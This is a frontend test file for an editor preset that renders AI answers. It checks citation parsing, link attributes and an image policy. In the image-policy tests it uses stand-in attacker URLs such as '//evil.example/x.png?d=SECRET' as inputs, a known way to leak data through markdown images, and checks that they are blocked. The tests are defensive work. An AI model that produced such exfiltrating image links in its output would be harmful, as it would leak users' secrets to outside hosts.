import { readFileSync } from "node:fs";
import { join } from "node:path";
import { presets } from "@/components/editor/presets";
import { Editor } from "@tiptap/core";
import { afterEach, describe, expect, it } from "vitest";

type CitationFixture = { name: string; input: string; indices: number[] };

const fixtures = JSON.parse(
  readFileSync(
    join(process.cwd(), "..", "..", "ai-service", "tests", "fixtures", "citation-markers.json"),
    "utf8",
  ),
) as CitationFixture[];

const editors: Editor[] = [];

/** 使用真实预设解析 AI 回答，并在用后销毁编辑器。 */
function aiEditor(markdown: string): Editor {
  const editor = new Editor({ extensions: presets.aiAnswer({}), content: markdown });
  editors.push(editor);
  return editor;
}

/** 按文档顺序取出解析出的引用编号。 */
function citationIndices(editor: Editor): number[] {
  const indices: number[] = [];
  editor.state.doc.descendants((node) => {
    if (node.type.name === "aiCitation") indices.push(Number(node.attrs.index));
  });
  return indices;
}

afterEach(() => {
  for (const editor of editors.splice(0)) editor.destroy();
});

describe("AI 回答引用解析", () => {
  it.each(fixtures)("$name", ({ input, indices }) => {
    expect(citationIndices(aiEditor(input))).toEqual(indices);
  });
});

describe("AI 回答链接与图片策略", () => {
  /** 外链保留可见文字，并在带隔离关系的新标签中打开。 */
  it("保留可点击外链并设置新标签与安全关系", () => {
    const editor = aiEditor("[外部说明](https://example.com/path) https://example.com/raw");
    const links = Array.from(editor.view.dom.querySelectorAll("a"));

    expect(links).toHaveLength(2);
    expect(links.map((link) => link.getAttribute("target"))).toEqual(["_blank", "_blank"]);
    for (const link of links) {
      expect(link.getAttribute("rel")).toContain("noopener");
      expect(link.getAttribute("rel")).toContain("noreferrer");
    }
    expect(editor.view.dom.textContent).toContain("外部说明");
    expect(editor.view.dom.textContent).toContain("https://example.com/raw");
  });

  /** 当前上传链路生成的同源文件重定向图片可以展示。 */
  it("放行同源文件重定向图片", () => {
    const relative = aiEditor("![笔记图](/api/proxy/file/objects/9/redirect)");
    const absolute = aiEditor(
      `![笔记图](${window.location.origin}/api/proxy/file/objects/9/redirect)`,
    );

    expect(relative.view.dom.querySelector("img")?.getAttribute("src")).toBe(
      "/api/proxy/file/objects/9/redirect",
    );
    expect(absolute.view.dom.querySelector("img")?.getAttribute("src")).toBe(
      `${window.location.origin}/api/proxy/file/objects/9/redirect`,
    );
  });

  /** 内联、引用式和协议相对的外站图片都不生成图片节点。 */
  it("拒绝外站图片的所有 Markdown 写法", () => {
    const inline = aiEditor("![a [b] c](//evil.example/x.png?d=SECRET)");
    const reference = aiEditor("![x]\n\n[x]: //evil.example/a.png?d=SECRET");
    const absolute = aiEditor("![x](https://evil.example/a.png)");

    expect(inline.view.dom.querySelector("img")).toBeNull();
    expect(reference.view.dom.querySelector("img")).toBeNull();
    expect(absolute.view.dom.querySelector("img")).toBeNull();
  });

  /** 普通同源路径和伪协议图片也不会被当作对象存储图片。 */
  it("拒绝非文件重定向路径与伪协议图片", () => {
    const ordinary = aiEditor("![x](/login)");
    const pseudo = aiEditor("![x](data:image/png;base64,AAAA)");

    expect(ordinary.view.dom.querySelector("img")).toBeNull();
    expect(pseudo.view.dom.querySelector("img")).toBeNull();
  });

  /** 笔记只读预设不受 AI 回答图片策略影响。 */
  it("readonly 预设仍渲染笔记图片", () => {
    const editor = new Editor({
      extensions: presets.readonly({}),
      content: "![笔记图](https://example.com/note.png)",
    });
    editors.push(editor);

    expect(editor.view.dom.querySelector("img")?.getAttribute("src")).toBe(
      "https://example.com/note.png",
    );
  });
});
